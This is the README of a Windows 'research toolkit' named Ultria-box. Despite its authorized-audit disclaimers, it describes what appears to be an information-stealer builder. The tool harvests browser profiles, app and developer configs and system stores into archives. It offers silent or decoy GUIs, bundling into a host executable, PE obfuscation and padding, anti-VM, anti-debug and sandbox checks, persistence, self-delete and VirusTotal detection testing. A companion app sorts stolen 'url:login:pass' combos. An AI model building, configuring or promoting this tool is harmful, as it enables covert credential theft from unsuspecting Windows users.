# Ultria-box

A C++20 research toolkit for studying Windows data exposure and local security
posture. It packages a set of modular inspectors, a reproducible build pipeline
and two desktop interfaces used to review the resulting archives.

The project is intended for **security research, authorized audits and
blue-team training**: understanding what information a Windows environment
exposes is a prerequisite to protecting it.

Static binary, no external runtime.

## Scope

The codebase is a study of how a Windows environment stores and protects data.
It covers:

- browser profile storage and its platform-protected formats;
- local application state and developer tool configuration;
- Windows system stores and inventory;
- a staged collection pipeline with bounded file sizes;
- a modular builder and a report review interface.

Findings are written into a local archive for offline inspection. No part of
this project should be run against a third party without consent.

## Research boundaries

- Only inspect systems you own or are explicitly authorized to assess.
- Treat every generated archive as confidential and delete it after review.
- Follow your local laws and privacy regulations (GDPR and equivalents).
- Report discovered issues responsibly to the affected owner.

## Quick start

```bash
git clone https://github.com/Ultria-Box/Ultria-box.git
cd Ultria-box
cp builder_config.example.json builder_config.json
python3 tools/builder.py --debug --no-vt
# -> dist/ultria.exe
```

Interfaces: `ultria-studio checker` (archive/combo review) or `--gui hotmail`
(secondary UI template).

## Build

**Linux prerequisites:** `mingw-w64` (`x86_64-w64-mingw32-g++`), `python3`.
**Windows:** use the Makefile through `make` (mingw); the code is portable C++20.

```bash
python3 tools/builder.py --config builder_config.json

make            # stub + checker + studio
make checker    # report review app
make studio     # CLI manager
make lib        # libultria.a for host-app integration
make DEBUG=1    # console build with verbose logging (ULTRA_DEBUG)
```

### Build configuration

Copy `builder_config.example.json` and adjust it:

| Key | Effect |
|---|---|
| `gui_mode` | `"none"` (silent) or a UI template (`checker`, `hotmail`) |
| `bind_exe` | optional host application to embed and launch |
| `obf_level` | PE layout variation level, 0–3 |
| `target_size_mb` | optional output padding |
| `output_name` | final binary name |
| `modules.*` | enable or disable individual inspectors |
| `enable_vm_check` / `enable_debug_check` / `enable_sandbox_check` | analysis-environment guards |
| `enable_persistence`, `self_delete` | optional lifecycle flags (off by default) |

Sensitive values are not versioned: `builder_config.json`,
`builder_secrets.json` and `src/config.h` are git-ignored; only `*.example.json`
templates are committed.

### Reproducibility

Each build uses a fresh seed, so generated strings and PE layout differ between
runs. `VT_API_KEY` enables an optional VirusTotal check:

```bash
export VT_API_KEY=...
python3 tools/vt_check.py dist/ultria.exe --submit --watch
```

## Studio and review app

The studio drives configuration, builds and archive review:

```bash
ultria-studio doctor
ultria-studio build --gui checker --no-vt
ultria-studio reports --dir <folder> [--search term] [--export out.txt]
ultria-studio checker [--build]
ultria-studio vt dist/ultria.exe
ultria-studio            # interactive menu
```

The checker app reviews collected archives: multi-file import, several
`url:login:pass` formats, deduplication, live search, filtered export and a
virtualized table.

## Operational notes

- The file inspector is capped by default: 8 MB per file, 200 MB total staging.
- Analysis-environment guards are enabled by default; disable them only in a
  controlled test VM.
- `make DEBUG=1` produces a console build with verbose logs; the default target
  is the silent release build.
